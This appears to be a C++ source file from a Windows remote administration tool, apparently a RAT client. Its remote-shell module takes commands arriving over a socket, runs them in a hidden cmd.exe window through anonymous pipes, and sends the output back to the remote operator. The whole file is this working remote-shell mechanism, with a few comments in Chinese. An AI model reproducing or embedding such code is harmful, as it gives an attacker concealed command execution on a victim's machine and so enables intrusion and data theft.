#include "pch.h"
#include "ModuleShellRemote.h"
#include "SocketClient.h"


CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {

}


CModuleShellRemote::~CModuleShellRemote() {

}



void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);					// 记得在线程函数里面delete这个包

	switch (pPacketCopy->m_PacketHead.wCommandId) {
		
	case SHELL_EXECUTE: 

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteShell, (LPVOID)pPacketCopy, 0, NULL);
		// 最终发现，创建个子线程运行ExecuteShell函数就能发包了。我猜测应该也和OnReceive回调中
		// 不要绘制对话框一个原因，因为ExecuteShell函数内有ReadFile,有管道交互等大量IO操作。

		break;

	case SHELL_CLOSE:
		m_pChildSocketClient->SendPacket(SHELL_CLOSE, NULL, 0);
		break;
	}
}


DWORD WINAPI ExecuteShell(LPVOID lParam)
{
	CPacket* pPacket = (CPacket*)lParam;
	//WCHAR pszCommand[512];
	//memcpy(pszCommand, pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
	//pszCommand[pPacket->m_dwPacketBodyLength] = '\n';
	CSocketClient* m_pChildSocketClient = pPacket->m_pSocketClient;

	CHAR pszCmd[512];
	DWORD dwBytesWritten = 0;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;
	HANDLE hRead2 = NULL, hWrite2 = NULL;

	WCHAR pszSystemPath[300] = { 0 };
	char SendBuf[2048] = { 0 };	
	SECURITY_ATTRIBUTES sa;				
	DWORD bytesRead = 0;
	int ret = 0;
	WCHAR pszExecuteCommand[512];

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道
	if (!CreatePipe(&hRead, &hWrite2, &sa, 0)) {
		goto Clean;
	}
	if (!CreatePipe(&hRead2, &hWrite, &sa, 0)) {
		goto Clean;
	}

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdInput = hRead2;
	si.hStdError = hWrite2;
	si.hStdOutput = hWrite2;	
	si.wShowWindow  =SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	// 获取系统目录
	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath)); 
	// 拼接成cmd命令
	//StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);
	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe", pszSystemPath);

	// 创建进程，执行cmd命令
	if (!CreateProcess(NULL, pszExecuteCommand, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		DebugPrint("error = 0x%x\n", GetLastError());
		goto Clean;
	}
	

	WideCharToMultiByte(CP_ACP, 0, (PWSTR)pPacket->m_pbPacketBody, -1, pszCmd, 512, NULL, NULL);
	strcat_s(pszCmd, "\n");
	
	WriteFile(hWrite, pszCmd, strlen(pszCmd), &dwBytesWritten, NULL);

	Sleep(1000);
	while (TRUE)
	{
		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);

		if (!bReadSuccess) {
			break;
		}
		else {
			// TODO 好像没用
			if (WAIT_OBJECT_0 != WaitForSingleObject(pPacket->m_pSocketClient->m_hChildSocketClientExitEvent, 0)) {
				BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
			}
			else {
				//MessageBox(0, L"ClientSocket exit", L"", 0);
			}
		}

		memset(SendBuf, 0, sizeof(SendBuf));
		Sleep(100);	
	}

Clean:
	//释放句柄
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	return 0;
}